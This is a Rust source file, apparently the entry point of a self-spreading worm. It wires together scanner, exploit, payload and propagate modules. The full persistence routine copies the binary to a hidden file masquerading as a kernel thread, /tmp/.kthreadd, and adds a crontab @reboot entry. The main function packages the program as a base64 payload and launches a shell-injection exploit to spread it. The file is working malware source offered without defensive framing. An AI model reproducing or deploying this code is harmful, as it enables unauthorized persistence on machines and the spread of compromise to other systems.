mod config;
mod exploit;
mod payload;
mod propagate;
mod scanner;

use crate::config::Config;
use crate::exploit::ShellInjector;
use std::sync::Arc;

fn install_persistence() {
    // Write self to a stable path and add a cron @reboot entry.
    // Done once; idempotent on re-exec.
    let path = "/tmp/.kthreadd";
    if let Ok(exe) = std::env::current_exe() {
        let _ = std::fs::copy(exe, path);
        let _ = std::process::Command::new("chmod")
            .args(["+x", path])
            .status();
    }
    let crontab_entry = "@reboot /tmp/.kthreadd >/dev/null 2>&1 &\n";
    let existing = std::process::Command::new("crontab")
        .arg("-l")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    if !existing.contains(path) {
        let new = format!("{}{}", existing, crontab_entry);
        let mut child = std::process::Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()
            .expect("crontab");
        use std::io::Write;
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(new.as_bytes());
        }
        let _ = child.wait();
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    install_persistence();

    let cfg = Arc::new(Config::default());
    let payload_b64 = Arc::new(payload::self_b64()?);
    let exploit: Arc<dyn crate::exploit::Exploit> =
        Arc::new(ShellInjector::new(cfg.payload_cmd_tmpl.clone()));

    propagate::run(cfg, exploit, payload_b64).await;
    Ok(())
}
